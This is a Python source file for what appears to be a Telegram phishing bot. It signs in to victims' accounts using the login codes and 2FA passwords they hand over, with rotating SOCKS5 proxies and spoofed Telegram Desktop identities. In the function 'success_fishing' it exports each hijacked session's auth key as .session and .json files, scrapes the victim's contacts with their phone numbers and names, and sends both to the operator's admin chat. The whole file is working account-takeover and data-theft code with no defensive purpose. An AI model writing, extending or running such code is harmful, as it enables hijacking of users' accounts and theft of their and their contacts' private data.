import asyncio
import telethon
import random
import io
import json
import zipfile
import aiosqlite

from telethon.tl import types
from config import ADMIN_ID, TEMPLATE, SESSION_JSON_PARAMS
from contextlib import suppress
from aiogram.types import Message, KeyboardButton, ReplyKeyboardMarkup, InputMediaDocument, BufferedInputFile
from aiogram.fsm.context import FSMContext
from pathlib import Path
from loader import bot

from opentele.api import API
from opentele.tl.telethon import MemorySession, TelegramClient
from TGConvertor.sessions.tele import TeleSession, SCHEMA
from database import utils_db
from database.models import Session, TelegramSession


def get_proxy():
    with open("proxies.txt") as file:
        proxy = random.choice(file.read().splitlines())

        return {
            'proxy_type': 'socks5',
            'addr': proxy.split(":")[0],
            'port': int(proxy.split(":")[1]),
            'username': proxy.split(":")[2],
            'password': proxy.split(":")[3],
            'rdns': True
        }


class SessionManager:
    def __init__(
            self,
            unique_id: int,
            session: MemorySession = None, 
    ):
        self.api_data = API.TelegramDesktop.Generate(
            system="macos",
            unique_id=unique_id,
        )   

        self.session = session or MemorySession()
         
        self.proxy = get_proxy()

        self.client = TelegramClient(
            self.session,
            self.api_data,
            proxy=self.proxy,
            connection=telethon.network.connection.ConnectionTcpAbridged,
            connection_retries=2,
            timeout=5
        )

    async def send_code(self, phone_number: str) -> str:
        return await self.client.send_code_request(phone_number)

    async def sign_in(self, phone: str, code: str = None, code_hash: str = None, password: str = None):
        return await self.client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=code_hash,
            password=password
        )

    async def save(self) -> TelegramSession:
        return TelegramSession(
            dc_id=self.session.dc_id,
            hex_key=self.session.auth_key.key.hex()
        )
    
    async def get_contacts(self) -> list[types.User]:
        dialogs = await self.client.get_dialogs()

        contacts = []

        for dialog in dialogs:
            if not dialog.is_user: continue

            entity: types.User = dialog.entity

            if not entity.phone: continue

            contacts.append(entity)

        return contacts

    async def __aenter__(self):
        await self.client.connect()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.client.disconnect()
        return self.client.session.save()





class OpenTeleSession(TeleSession):
    async def to_file(self, path: Path):
        async with aiosqlite.connect(path) as db:
            await db.executescript(SCHEMA)
            await db.commit()
            
            sql = "INSERT INTO sessions VALUES (?, ?, ?, ?, ?)"
            params = (
                self.dc_id,
                self.server_address,
                self.port,
                self.auth_key,
                self.takeout_id
            )
            
            await db.execute(sql, params)

            await db.execute("INSERT INTO version VALUES (?)", (7,))

            await db.commit()


def get_session_json(user_id: int) -> bytes:
    session_api: dict = API.TelegramDesktop.Generate(
        unique_id=user_id
    ).__dict__

    session_api["app_id"] = session_api.pop("api_id")
    session_api["app_hash"] = session_api.pop("api_hash")
    session_api["device"] = session_api.pop("device_model")
    session_api["sdk"] = session_api.pop("system_version")
    session_api["user_id"] = user_id

    session_params = SESSION_JSON_PARAMS.copy()

    session_params.update(session_api)

    return json.dumps(session_params).encode()


async def archive_session(session: Session):
    worker_sessions_dir = Path("sessions") / str(session.user_id)
    worker_sessions_dir.mkdir(parents=True, exist_ok=True)
    
    archive_buffer = io.BytesIO()

    with zipfile.ZipFile(
        archive_buffer, "w",
        compression=zipfile.ZIP_DEFLATED
    ) as archive:
        session_path = worker_sessions_dir / f"{session.phone_number}.session"

        tele_session = OpenTeleSession(
            dc_id=session.telegram_session.dc_id,
            auth_key=bytes.fromhex(session.telegram_session.hex_key)
        )

        await tele_session.to_file(session_path)

        archive.writestr(
            f"{session.phone_number}.session",
            session_path.open("rb").read()
        )
        archive.writestr(
            f"{session.phone_number}.json",
            get_session_json(session.user_id)
        )

        session_path.unlink(True)

    archive_buffer.seek(0)
    
    return archive_buffer.getvalue()


async def expiration_timer(session: Session, state: FSMContext, msg: Message):
    await asyncio.sleep(4 * 60)

    session = utils_db.get_session(session.user_id)

    if session.stage == 3:
        return
    
    session.stage = 0
    session.save()

    await state.clear()

    with suppress(Exception):
        await msg.answer(
            TEMPLATE["expiration_auth"],
            reply_markup=ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text=session.bot.template.template["button"])]
                ],
                resize_keyboard=True
            )
        )


async def success_fishing(
        session: Session,

):
    session_manager = SessionManager(
        session.user_id,
        session.telegram_session and session.telegram_session.get_session()
    )

    async with session_manager as _session:
        contacts = await _session.get_contacts()

        contact_file = io.BytesIO()

        for contact in contacts:
            contact_file.write(
                (f"Номер: {contact.phone}\n"
                f"Имя: {contact.first_name} {contact.last_name}\n"
                f"Юзер: {contact.username}\n\n").encode()
            )
    
        contact_file.seek(0)

        await bot.send_media_group(
            ADMIN_ID,
            media=(
                InputMediaDocument(
                    media=BufferedInputFile(
                        (await archive_session(session)),
                        filename=f"{session.phone_number}.zip"
                    )
                ),
                InputMediaDocument(
                    media=BufferedInputFile(
                        contact_file.getvalue(),
                        filename="contacts.txt"
                    )
                )
            ),
            message_effect_id="5046509860389126442"
        )